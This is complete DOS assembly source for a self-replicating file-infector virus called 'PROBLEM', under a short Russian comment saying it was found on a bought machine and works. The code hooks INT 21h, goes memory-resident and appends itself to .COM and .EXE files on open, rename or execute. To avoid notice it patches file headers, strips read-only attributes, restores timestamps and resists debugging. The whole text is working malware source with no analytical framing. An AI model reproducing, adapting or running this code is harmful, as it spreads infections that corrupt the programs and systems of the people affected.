;	Исходник эннтого виpуса (PROBLEM) обнpаужен на купленной
;  нами машине . Веpоятно новая ваpиация на стpаые темы.
;  И не без неточностей , но pаботает .
;       Автоp похоже любит стеки и вообще усложнять
;  себе жизнь. И воoбще татить вpемя .
;       Подpобнно не смотpел.
;							Василь.

PAGE 64,132

;--------------------------------------------------------------------------

MOD_SIZE    EQU     (MOD_TOP-START+0Fh)/10h
ARE_SIZE    EQU     (ARE_TOP-START+0Fh)/10h	
STK_SIZE    EQU	    (ARE_TOP-START+10h)

;--------------------------------------------------------------------------

SEG_C     SEGMENT BYTE PUBLIC 'CODE'
	  ASSUME CS:SEG_C , DS:SEG_C , SS:SEG_S
	  
BOOT	  PROC	FAR				;
START:	  CALL	CALC				;
CALC:	  POP	SI				;
	  SUB	SI,(CALC-START)			;
	  PUSH	DS				;
	  MOV	AX,3521h			; SAVE INT 21h VECTOR 
	  INT	21h				; 
CHECK:	  CLI					;
	  MOV	WORD PTR CS:VEC_21h+2[SI],ES	;
	  MOV	WORD PTR CS:VEC_21h  [SI],BX	;
	  MOV	AX,DS				;
	  ADD	WORD PTR CS:JUMP  +3[SI],AX	;
	  ADD	WORD PTR CS:SSSAVE+1[SI],AX	;
	  DEC	AX				;
CHECJ:	  JMP	SHORT FIRST			;
NEXT:	  CMP   BYTE PTR ES:0,4Dh		;
	  JNE	EXIT				;
	  ADD	AX,ES:3				;
FIRST:	  MOV	ES,AX				; ES TO MCB
	  INC	AX				;
	  CMP	BYTE PTR ES:0,5Ah		;
	  JNE	NEXT				; Jump if NOT equal
	  MOV	BX,ES:3                 	; GOOD MCB CORRECTION
	  SUB	BX,ARE_SIZE			;
	  JC	EXIT				; Jump if carry Set
	  MOV	ES:3,BX				;
	  SUB	WORD PTR ES:12H,ARE_SIZE	;
	  ADD	AX,BX				;
	  MOV	ES,AX				;
	  XOR	DI,DI				;
	  MOV   CX,MOD_SIZE*10H+4      		; SIZE OF MOVING CODE
	  CLD					;
	  REP	MOVS BYTE PTR ES:[DI],CS:[SI]	;
	  PUSH	ES				;
	  POP	DS				;
	  MOV   BYTE PTR DS:INT_21h,09Ch	;
	  MOV	DX,(INT_21h-START)		; SET  INT 21h VECTOR
	  MOV	AX,2521h			;
	  INT	21h	 			;
EXIT:	  POP	DS				;
	  PUSH	DS				;
	  POP	ES				;
S_SAV1:;  MOV	WORD PTR DS:100h,0		;
	  JMP	SHORT SSSAVE			; SELECTOR
	  DB	00,01,00,00			;
S_SAV2:	  MOV	WORD PTR DS:102h,0		;
S_SAVCH:  MOV	WORD PTR DS:110h,0		;
	  JMP	SHORT OUT_C			;
SSSAVE:	  MOV	AX,0010h			;
	  MOV   SS,AX				;
SPSAVE:	  MOV	SP,(ARE_TOP-START)		;
OUT_C:	  XOR	AX,AX				;
JUMP: ;	  JMP	FAR PTR OUEXIT			;
	  DB	0EAh				;
	  DW	(OUEXIT-START),0010h		;
BOOT	  ENDP					;
;----------------------------------------------------------------------------

C_200	DW	200h
C_10	DW	10h

;----------------------------------------------------------------------------

INT_24h:  MOV	AL,3				;
	  IRET					;
						;
INT_21h:  PUSHF					;
	  PUSH	BP				;
	  XOR	BP,BP				;
	  PUSH	BP				; DEBUG PROTECTION
	  POPF					;
	  SUB	SP,2				;
	  MOV	BYTE PTR CS:RET_I,2Eh		;
	  POP	BP				;
	  CMP	BP,0				;
	  JNE	EX_INT				;
	  CMP	AH,3Dh				;
	  JNE	NEXT_0				;
	  CMP	AL,1h				;
	  JNE	FILE_DO				;
NEXT_0:	  CMP	AH,56h				;
	  JE	FILE_DO				;
	  CMP	AH,4Bh				;
	  JNE	NEXT_1				;
FILE_DO:  MOV	BP,(EXEC_FIL-CALL1-3)		;
NEXT_1:	  CMP	AX,3521h			;
	  JNE	NEXT_2				;
	  MOV	BP,(CH_INST -CALL1-3)		;
NEXT_2:						;
	  OR	BP,BP				;
	  JZ	EX_INT				;
          MOV	WORD PTR CS:CALL1+1,BP		;
	  CMP	BP,(EXEC_FIL-START)		;
	  JA	RET_2				;
	  CALL	CALLER				;
EX_INT:	  POP	BP				;
	  POPF					;
RET_I:	  JMP	DWORD PTR CS:VEC_21h		;

RET_2:	  CALL	INT_21h				;
	  PUSH	AX				;
	  SAHF					;
	  MOV	SP,BP				;
	  MOV	SS:[BP+6],AX			;	
	  POP	AX				;
	  CALL	CALLER				;
	  POP	BP				;
	  POPF
	  IRET					;

;----------------------------------------------------------------------------

CALLER	  PROC	NEAR
	  MOV	CS:SAV_SS,SS			;
	  MOV	CS:SAV_SP,SP			;
	  PUSH	CS				;
	  POP	SS				;
	  MOV	SP,OFFSET ARE_TOP		;
	  PUSH	ES				; [BP+16]
	  PUSH	DS				; [BP+14]
	  PUSH	DI				; [BP+12]
	  PUSH	SI				; [BP+10]
	  PUSH	AX				; [BP+ 8]
	  PUSH	BX				; [BP+ 4]
	  PUSH	CX				; [BP+ 2]
	  PUSH	DX				; [BP   ]
	  MOV	BP,SP				;
          MOV   BYTE PTR CS:INT_21h,0CFh	;
CALL1:	  CALL	EXEC_FIL			;
	  MOV   BYTE PTR CS:INT_21h,09Ch	;
	  POP	DX				;
	  POP	CX				;
	  POP	BX				;
	  POP	AX				;
	  POP	SI				;
	  POP	DI				;
	  POP	DS				;
	  POP	ES				;
	  MOV	SS,CS:SAV_SS			;
	  MOV	SP,CS:SAV_SP			;
	  RETN	
CALLER	  ENDP

;----------------------------------------------------------------------------

CH_INST	  PROC  NEAR
	  LES	BX,DWORD PTR CS:SAV_SP
	  LES	BX,DWORD PTR ES:[BX+6]
CH_NEX:	  CMP	ES:[BX],2EFAh
	  JNE	RET_INST
          ADD	BYTE PTR ES:[BX+CHECJ-CHECK],(EXIT-FIRST)
	  MOV	BYTE PTR CS:RET_I,0CFh
RET_INST: RETN
CH_INST	  ENDP

;----------------------------------------------------------------------------

EXEC_FIL  PROC	NEAR			;
	  CALL	FILE_O			;
	  PUSH	CS			;
	  POP	DS			;
       	  MOV	DX,OFFSET Header	;  READ HEADER
	  MOV	CX,20h			;
	  CALL	READ			;
	  MOV	AX,ExeSP		;  SEE MARK
	  MOV	WORD PTR SPSAVE+1 ,AX	;
	  MOV	WORD PTR S_SAVCH+4,AX	;
	  SUB	AX,ExeIP		;
	  CMP	AX,STK_SIZE		;
	  JE	JERR			;
	  MOV	AL,2			;
	  CALL	INT_STR			; Length of file
	  CMP	DX,3h			; Greate 3*64K ?
	  JGE	JERR			;
	  PUSH	AX			;
	  MOV	AX,HEADER		;

	  CMP	AX,5A4Dh		;
	  JE	ALSO			;
	  CMP	AX,4D5Ah		;
	  JE	ALSO			;

	  MOV	WORD PTR S_SAV1+4,AX	;
	  MOV	WORD PTR S_SAV1,06C7h	;
	  XOR	AX,AX			;
	  MOV	WORD PTR JUMP+3,AX	;
	  MOV	WORD PTR JUMP+1,100h	;
	  MOV	AX,PartPag		;
	  MOV	WORD PTR S_SAV2+4,AX	;
	  MOV   BYTE PTR HEADER,0E9h	;
	  POP	AX			;
	  SUB	AX,3h			;
	  MOV	WORD PTR HEADER+1,AX	;
	  JMP	SHORT WRITE_F		;
	  
JERR:	  RETN				;
ALSO:	  MOV	WORD PTR S_SAV1,12EBh	;
	  MOV	AX,ExeIP		;
	  MOV	WORD PTR JUMP+1,AX	;
	  MOV	AX,ReloCS		;
	  ADD	AX,10h			;
	  MOV	WORD PTR JUMP+3,AX	;
	  MOV	AX,ReloSS		;
	  ADD   AX,10h			;
	  MOV	WORD PTR SSSAVE+1,AX	;
	  POP	AX			;
	  MOV	DI,DX			;
	  MOV	SI,AX			;
	  ADD	AX,OFFSET MOD_TOP	;
	  ADC	DX,0			;
	  DIV	C_200			;
	  INC	AX			;
	  MOV	PageCnt,AX		;
	  MOV	PartPag,DX		; New
	  MOV	AX,HdrSize		;
	  MUL	C_10			;
	  XCHG	DX,DI			;
	  XCHG	AX,SI			;
	  SUB	AX,SI			;
	  SBB	DX,DI			;
	  DIV	C_10			;
	  MOV	ExeIP,DX		;
	  MOV	ReloCS,AX		;
	  MOV	ReloSS,AX		;
	  INC	MinMem			;
;....

WRITE_F:
	  MOV	AX,ExeIP		;
	  ADD	AX,STK_SIZE		;
	  MOV	ExeSP,AX		;
	  XOR	DX,DX			;
	  MOV	CX,OFFSET MOD_TOP	;
	  CALL  WRITE		  	; 
	  XOR	AL,AL			;
	  CALL	INT_STR			;
	  MOV	DX,OFFSET HEADER	;
	  MOV	CX,20h			;
	  CALL	WRITE			;
	  RETN				;
EXEC_FIL  ENDP

;----------------------------------------------------------------------------
;	FILE DS:DX OPEN/CLOSE ROUTINE
;----------------------------------------------------------------------------

DOIT	  PROC	NEAR
	  LODSB
	  CMP	AL,'a'
	  JB	J1
	  SUB	AL,('a'-'A')
J1:	  CMP	AL,AH
	  RETN
DOIT	  ENDP

FILE_O    PROC  NEAR				;

	  POP	BX

	  PUSH	DS
	  POP	ES
	  MOV	DI,DX
	  MOV	AL,'.'
	  MOV	CX,100h
   REPNE  SCASB 
	  JNE	ABORT
	  MOV	SI,DI
	  MOV	AH,'C'
	  CALL	DOIT
	  JNE	N_EXE
C_2:	  MOV	AH,'O'
	  CALL	DOIT
	  JNE	N_EXE
C_3:	  MOV	AH,'M'
	  CALL	DOIT
	  JE	CONTIN
N_EXE:	  MOV	SI,DI
	  MOV	AH,'E'
	  CALL	DOIT
	  JNE	ABORT
E_2:	  MOV	AH,'X'
	  CALL	DOIT
	  JNE	ABORT
E_3:	  MOV	AH,'E'
	  CALL	DOIT
	  JE	CONTIN
ABORT:	  RETN
CONTIN:
	  MOV	WORD PTR CS:EXEC_P,BX		;
	  MOV	SI,DX				;
	  MOV	AX,3300h			; STORE C/BREAK
	  CALL  INT_21				;
	  PUSH	DX				;
	  MOV	AX,3301h			; SET C/BREAK
	  PUSH	AX
	  XOR	DL,DL				;
	  CALL	INT_21				;
	  MOV	AX,3524h			; SAVE INT 24h VECTOR 
	  CALL	INT_21				; TO ES:BX
	  PUSH	ES				;
	  PUSH	BX				;
	  PUSH	DS				;
	  PUSH	CS				;
	  POP	DS				;
	  MOV	DX,(INT_24h-START)		; SET  INT 24h VECTOR
	  MOV	AX,2524h			; TO DS:DX
	  CALL	INT_21	 			;
	  POP	DS				;
	  MOV	AH,54h				; STORE RETRY NUM
	  CALL	INT_21				;
	  PUSH	AX				;
	  MOV	AX,2E00h			; CLEAR RETRY NUM
	  CALL	INT_21				;
	  MOV	DX,1
	  CALL	RETRY
	  MOV	DX,SI				;
	  PUSH	DS				;
	  PUSH	DX				;
	  MOV	AX,4300h			; STORE FILE ATRIBUTES
	  CALL	INT_21				;
	  PUSH	CX				;
	  TEST	CL,1				;
	  JZ	SKIP1				;
	  MOV	AX,4301h			; SET   FILE ATRIBUTES
	  XOR	CX,CX				;
	  CALL	INT_21				;
	  JC	SKIP2				;
SKIP1:    MOV   AX,3D02h			; OPEN IN
	  CALL	INT_21				;   R/W MODE
	  JC    SKIP2				;
	  MOV   WORD PTR CS:INT_HAN+1,AX	; STORE HANDLE
	  MOV	AX,5700h			; STORE DATE&TIME
	  CALL	INT_HAN				;
	  PUSH	CX				;
	  PUSH	DX				;
	  CALL	WORD PTR CS:EXEC_P		; CALL USER FILE_0
	  POP	DX				;
	  POP	CX				;
	  MOV	AX,5701h			; RESET DATA&TIME
	  CALL	INT_HAN				;
	  MOV   AH,3Eh				; CLOSE FILE
	  CALL  INT_HAN				;
SKIP2:	  POP	CX				;
	  POP	DX				;
	  POP	DS				;
	  XOR	CH,CH				;
	  TEST	CL,1				;
	  JZ	SKIP3				;
	  MOV	AX,4301h			; RESET FILE ATTRIBUTES
	  CALL	INT_21				;
SKIP3:
	  MOV	DX,3
	  CALL	RETRY
	  POP	AX				; SET RETRY NUM
	  MOV	AH,2Eh				;
	  CALL	INT_21				;
	  POP	DX				;
	  POP	DS				;
	  MOV	AX,2524h			;
	  CALL	INT_21				;
	  POP	AX
	  POP	DX				;
	  CALL	INT_21				;	  
EXIT_O:   RETN					;
FILE_O    ENDP					;

;---------------------------------------------------------------------------
						;
IO	  PROC  NEAR				;
READ:	  MOV	AH,3Fh				; READ ROUTINE
	  JMP	SHORT L_IO			;
WRITE:	  MOV	AH,40h				; WRITE ROUTINE
L_IO:     CALL	INT_HAN				;
	  JC	ERR_IO				;
	  CMP	AX,CX				;
	  JNC	RET_IO				;
ERR_IO:	  POP	AX				;
RET_IO:	  RETN					;
IO	  ENDP					;
						;
SERVICE	  PROC	NEAR				; INT 21h EMULATOR
RETRY:	  MOV	AX,440Bh			;
	  MOV	CX,1				;
	  JMP	SHORT INT_21			;
INT_STR:  XOR	CX,CX				; POINTER TO START
	  XOR 	DX,DX				;
INT_SET:  MOV	AH,42h				; SET FILE POINTER
INT_HAN:  MOV	BX,0				; FILE HANDLE
INT_21:   PUSHF					; PUSH FLAGS
	  CLI					; DISABLE INTERRUPT
	  CALL	DWORD PTR CS:VEC_21h		; INT 21
	  RETN  				; RETURN
SERVICE	  ENDP					;

	  DB	'THIS IS YOUR PROBLEM !'
						;
;---------------------------------------------------------------------------

MOD_TOP:

VEC_21h   DD	0
VEC_24h	  DD	0
EXEC_P	  DW	0
SAV_BP	  DW	0
SAV_SP	  DW	0
SAV_SS	  DW	0

Header	  DW	0			; 
PartPag	  DW	0
PageCnt	  DW	0
ReloCnt	  DW	0
HdrSize	  DW	0
MinMem	  DW	0
MaxMem	  DW	0
ReloSS	  DW	0
ExeSP	  DW	0
ChkSum	  DW	0
ExeIP	  DW	0
ReloCS	  DW	0
TablOff	  DW	0
Overlay	  DW	0
SizForm	  DW	0

STACK_ARE DB	100 DUP(?)

ARE_TOP:

OUEXIT:  MOV	AH,4Ch				;
	 INT	21h				;

SEG_C	   ENDS


SEG_S     SEGMENT BYTE STACK
	  DW	20 DUP (?)
SEG_S	  ENDS


	  END	START
